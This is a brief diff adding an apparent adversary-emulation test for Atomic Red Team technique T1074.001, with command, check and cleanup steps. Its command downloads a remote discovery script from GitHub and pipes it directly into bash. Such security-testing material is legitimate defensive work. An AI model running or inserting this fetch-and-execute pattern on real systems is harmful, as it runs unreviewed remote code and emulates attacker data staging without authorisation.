@@ -1,0 +1,7 @@
+Waiting Required;
+#command
+curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | bash -s > /tmp/T1074.001_discovery.log
+#check
+cat /tmp/T1074.001_discovery.log | head -n 5
+#cleanup
+rm -f /tmp/T1074.001_discovery.log
